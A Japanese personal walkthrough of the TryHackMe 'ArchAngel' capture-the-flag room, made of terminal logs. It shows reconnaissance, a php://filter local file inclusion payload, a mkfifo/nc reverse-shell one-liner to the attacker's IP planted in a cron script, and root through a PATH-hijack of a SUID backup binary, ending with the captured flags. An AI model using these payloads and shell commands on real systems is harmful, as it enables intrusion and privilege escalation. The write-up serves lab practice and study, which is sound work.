1/1/2024

偵察

┌──(root㉿kali)-\[/home/kali\]

└─# nmap -sV 10.10.33.41

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-01 20:17 JST

Nmap scan report for 10.10.33.41

Host is up (0.32s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 44.03 seconds

webの探索

┌──(root㉿kali)-\[/home/kali\]

└─# gobuster dir -u http://10.10.33.41 -w /usr/share/dirb/wordlists/common.txt

\===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

\===============================================================

\[+\] Url:                     http://10.10.33.41

\[+\] Method:                  GET

\[+\] Threads:                 10

\[+\] Wordlist:                /usr/share/dirb/wordlists/common.txt

\[+\] Negative Status codes:   404

\[+\] User Agent:              gobuster/3.6

\[+\] Timeout:                 10s

\===============================================================

Starting gobuster in directory enumeration mode

\===============================================================

/.htaccess            (Status: 403) \[Size: 276\]

/.hta                 (Status: 403) \[Size: 276\]

/.htpasswd            (Status: 403) \[Size: 276\]

/flags                (Status: 301) \[Size: 310\] \[--> http://10.10.33.41/flags/\]

/images               (Status: 301) \[Size: 311\] \[--> http://10.10.33.41/images/\]

/index.html           (Status: 200) \[Size: 19188\]

/layout               (Status: 301) \[Size: 311\] \[--> http://10.10.33.41/layout/\]

/pages                (Status: 301) \[Size: 310\] \[--> http://10.10.33.41/pages/\]

/server-status        (Status: 403) \[Size: 276\]

Progress: 4614 / 4615 (99.98%)

\===============================================================

Finished

\===============================================================

webサイトにアクセスするとメールアドレスからホスト名ゲット

support@mafialive.thm

ホスト名を追加

┌──(root㉿kali)-\[/home/kali\]

└─# echo 10.10.33.41 mafialive.thm | sudo tee -a /etc/hosts

10.10.33.41 mafialive.thm

ブラウザでアクセス

![[ArchAngel image.png]]

開発中のページでフラグゲット

![[ArchAngel image 1.png]]

行き詰ったのでwriteup参照

https://medium.com/@josephalan17201972/archangel-tryhackme-write-766e010a74c5

urlをbase64デコードするらしい

URL

変更前

http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php

変更後

http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php

![[ArchAngel image 2.png]]

末尾を元々のtest.phpに変えて再実行

![[ArchAngel image 3.png]]

CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==

上記が出てくるのでデコード

┌──(root㉿kali)-\[/home/kali\]

└─# echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d

\<!DOCTYPE HTML>

\<html>

\<head>

\<title>INCLUDE\</title>

\<h1>Test Page. Not to be Deployed\</h1>

\</button>\</a> \<a href="/test.php?view=/var/www/html/development_testing/mrrobot.php">\<button id="secret">Here is a button\</button>\</a>\<br>

\<?php

//FLAG: thm{explo1t1ng_lf1}

function containsStr($str, $substr) {

return strpos($str, $substr) !== false;

}

if(isset($_GET\["view"\])){

if(!containsStr($_GET\['view'\], '../..') && containsStr($_GET\['view'\], '/var/www/html/development_testing')) {

include $_GET\['view'\];

}else{

echo 'Sorry, Thats not allowed';

}

}

?>

\</div>

\</body>

\</html>

シェルの奪取

検知回避のためスペースを入れて/etc/passwdを見る

![[ArchAngel image 4.png]]

ここからBurp起動

![[ArchAngel image 5.png]]

ncで待ち受けてBurpからアクセスするようにRequestを送信するとshellゲット

バックドア設置

![[ArchAngel image 6.png]]

archangelの中にフラグゲット

![[ArchAngel image 7.png]]

ncで待ち受けてBurpでアクセスさせる

![[ArchAngel image 8.png]]

途中経過は省略してるのでサイト参考

あらかじめ待ち受けていたncに接続が来る

┌──(root㉿kali)-\[/home/kali\]

└─# nc -nvlp 4444\]

listening on \[any\] 4444 ...

connect to \[10.18.31.142\] from (UNKNOWN) \[10.10.74.133\] 45754

bash: cannot set terminal process group (443): Inappropriate ioctl for device

bash: no job control in this shell

www-data@ubuntu:/var/www/html/development_testing$ cd /tcp

cd /tcp

bash: cd: /tcp: No such file or directory

www-data@ubuntu:/var/www/html/development_testing$ cd /tmp

cd /tmp

www-data@ubuntu:/tmp$ wget http://10.18.31.142:8000/linpears.sh

wget http://10.18.31.142:8000/linpears.sh

--2024-01-01 19:48:33--  http://10.18.31.142:8000/linpears.sh

Connecting to 10.18.31.142:8000... connected.

HTTP request sent, awaiting response... 404 File not found

2024-01-01 19:48:34 ERROR 404: File not found.

あらかじめ自端末内にgithubからダウンロードしておいたファイルをやられ端末にダウンロード

www-data@ubuntu:/tmp$ wget http://10.18.31.142:8000/linpeas.sh

wget http://10.18.31.142:8000/linpeas.sh

--2024-01-01 19:49:34--  http://10.18.31.142:8000/linpeas.sh

Connecting to 10.18.31.142:8000... connected.

HTTP request sent, awaiting response... 200 OK

Length: 847920 (828K) \[text/x-sh\]

Saving to: 'linpeas.sh'

0K .......... .......... .......... .......... ..........  6% 62.2K 13s

50K .......... .......... .......... .......... .......... 12% 62.2K 12s

100K .......... .......... .......... .......... .......... 18%  156K 9s

150K .......... .......... .......... .......... .......... 24%  124K 7s

200K .......... .......... .......... .......... .......... 30%  155K 6s

250K .......... .......... .......... .......... .......... 36%  284M 5s

300K .......... .......... .......... .......... .......... 42%  622K 4s

350K .......... .......... .......... .......... .......... 48%  207K 3s

400K .......... .......... .......... .......... .......... 54%  621K 3s

450K .......... .......... .......... .......... .......... 60%  250M 2s

500K .......... .......... .......... .......... .......... 66%  130M 2s

550K .......... .......... .......... .......... .......... 72%  158K 1s

600K .......... .......... .......... .......... .......... 78%  159M 1s

650K .......... .......... .......... .......... .......... 84%  625K 1s

700K .......... .......... .......... .......... .......... 90%  218M 0s

750K .......... .......... .......... .......... .......... 96%  151M 0s

800K .......... .......... ........                        100%  186M=3.5s

2024-01-01 19:49:38 (240 KB/s) - 'linpeas.sh' saved \[847920/847920\]

www-data@ubuntu:/tmp$ chmod 777 linpeas.sh

chmod 777 linpeas.sh

www-data@ubuntu:/tmp$ ls -la

ls -la

total 840

drwxrwxrwt  2 root     root       4096 Jan  1 19:49 .

drwxr-xr-x 22 root     root       4096 Nov 16  2020 ..

-rwxrwxrwx  1 www-data www-data 847920 Jan  1 19:05 linpeas.sh

www-data@ubuntu:/tmp$ ./linpeas.sh > output.txt

./linpeas.sh > output.txt

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . cat: write error: Broken pipe

cat: write error: Broken pipe

cat: write error: Broken pipe

cat: write error: Broken pipe

cat: write error: Broken pipe

grep: /etc/motd: No such file or directory

sed: -e expression #1, char 0: no previous regular expression

logrotate 3.11.0

www-data@ubuntu:/tmp$

www-data@ubuntu:/tmp$ ./linpeas.sh > Output.txt

./linpeas.sh > Output.txt

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .      . . . . . . . cat: write error: Broken pipe

cat: write error: Broken pipe

cat: write error: Broken pipe

cat: write error: Broken pipe

cat: write error: Broken pipe

grep: /etc/motd: No such file or directory

sed: -e expression #1, char 0: no previous regular expression

logrotate 3.11.0

www-data@ubuntu:/tmp$ echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/

www-data@ubuntu:/tmp$ cd /opt

cd /opt

www-data@ubuntu:/opt$ echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/     sh -i 2>&1 | nc 10.18.31.142 1234 > /tmp/f" >> helloworld.sh

\<1 | nc 10.18.31.142 1234 > /tmp/f" >> helloworld.sh

www-data@ubuntu:/opt$

root化

┌──(root㉿kali)-\[/home/kali\]

└─# nc -nvlp 1234

listening on \[any\] 1234 ...

connect to \[10.18.31.142\] from (UNKNOWN) \[10.10.74.133\] 52422

/bin/sh: 0: can't access tty; job control turned off

$ id

uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)

$ cd ~/secret

$ cat user.txt

cat: user.txt: No such file or directory

$ cat user2.txt

thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

$ ls -la

total 32

drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .

drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..

-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup

-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

$ ./backup

cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory

$ echo '/bin/bash -p' > cp

$ chmod 777 cp

$ ls -la |grep cp

-rwxrwxrwx 1 archangel archangel    13 Jan  1 20:12 cp

$ import PATH=/tmp:$PATH

/bin/sh: 10: import: not found

$ echo &PATH

/bin/sh: 11: PATH: not found

$

import PATH=/tmp:$PATH

/bin/sh: 12: import: not found

$ pwd

/home/archangel/secret

$ cd ~/secret

$ ls -la

total 36

drwxrwx--- 2 archangel archangel  4096 Jan  1 20:12 .

drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..

-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup

-rwxrwxrwx 1 archangel archangel    13 Jan  1 20:12 cp

-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

$ ./backup

cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory

$ cd /tmp

$ echo '/bin/bash -p' > cp

$ chmod 777 cp

$ ls -la | grep cp

-rwxrwxrwx  1 archangel archangel   13 Jan  1 20:15 cp

$ import PATH=/tmp:$PATH

/bin/sh: 21: import: not found

$ cd ~/secret

$ ./backup

cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory

$ import

/bin/sh: 24: import: not found

$ cd /tmp

$ import

/bin/sh: 26: import: not found

$ cd ~/secret

ls -la

./backup

$ total 36

drwxrwx--- 2 archangel archangel  4096 Jan  1 20:12 .

drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..

-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup

-rwxrwxrwx 1 archangel archangel    13 Jan  1 20:12 cp

-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

$ cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory

$ pwd

/home/archangel/secret

$ cd /tmp

$ echo '/bin/bash -p' > cp

$ chmod 777 cp

$ ls -la | grep cp

-rwxrwxrwx  1 archangel archangel   13 Jan  1 20:18 cp

$ export PATH=/tmp:$PATH

$ echo $PATH

/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

$ cd ~/secret

$ pwd

/home/archangel/secret

$ ./backup

id

uid=0(root) gid=0(root) groups=0(root),1001(archangel)

ls

backup

cp

user2.txt

whoami

root

cd /root

ls

root.txt

cat root.txt

thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}

flagゲットして終わり